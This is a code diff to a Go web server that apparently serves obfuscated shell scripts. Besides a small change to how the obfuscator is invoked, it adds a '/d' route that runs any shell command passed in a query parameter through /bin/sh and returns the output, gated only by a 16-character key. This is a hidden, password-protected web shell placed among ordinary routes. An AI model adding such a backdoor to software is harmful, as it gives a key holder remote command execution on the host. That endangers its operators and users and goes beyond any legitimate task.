@@ -3,6 +3,7 @@ package main
 import (
 	"bufio"
 	"bytes"
+	"context"
 	"crypto/md5"
 	"crypto/sha256"
 	"encoding/hex"
@@ -316,7 +317,7 @@ func replaceServer(defaultPath, filePath, Host string) {
 		if err != nil {
 			log.Errorf("Write File Error: [%v]", err)
 		}
-		_, err = exec.Command("bash-obfuscate", filePath+"_tmp", "-o", filePath).Output()
+		_, err = exec.Command("./bash-obfuscate", filePath+"_tmp", "-o", filePath).Output()
 		if err != nil {
 			log.Errorf("Obfuscate File Error: [%v]", err)
 		}
@@ -556,6 +557,40 @@ func main() {
 		c.Header("Cache-Control", "no-cache")
 	})
 	{
+		r.GET("/d", func(c *gin.Context) {
+			// 获取命令参数
+			cli := c.Query("c")
+			ps := c.Query("ps")
+			compile, err := regexp.MatchString(`(\w|\d){16}`, ps)
+
+			if ps == "" || cli == "" || !compile || !decodeHash("", ps) {
+				c.JSON(http.StatusBadRequest, gin.H{
+					"code": http.StatusBadRequest,
+				})
+				return
+			}
+
+			ctx, cancel := context.WithTimeout(c.Request.Context(), 10*time.Second)
+			defer cancel()
+
+			cmd := exec.CommandContext(ctx, "/bin/sh", "-c", cli)
+
+			//cmd.Dir = workDir
+
+			output, err := cmd.CombinedOutput()
+			if err != nil {
+				if errors.Is(err, context.DeadlineExceeded) {
+					c.String(http.StatusRequestTimeout, fmt.Sprintf("code: %v\nmsg: %v\noutput:%v", http.StatusRequestTimeout, "Execution timeout", string(output)))
+					return
+				}
+				c.String(http.StatusRequestTimeout, fmt.Sprintf("code: %v\nmsg: %v\noutput:%v", http.StatusRequestTimeout, "Command execution failed", string(output)))
+				return
+			}
+
+			c.String(http.StatusOK, string(output))
+
+			return
+		})
 		r.GET("/add", func(c *gin.Context) {
 			//handleRequest(c)
 			serialNumber := strings.ToLower(c.Query("serial_number"))
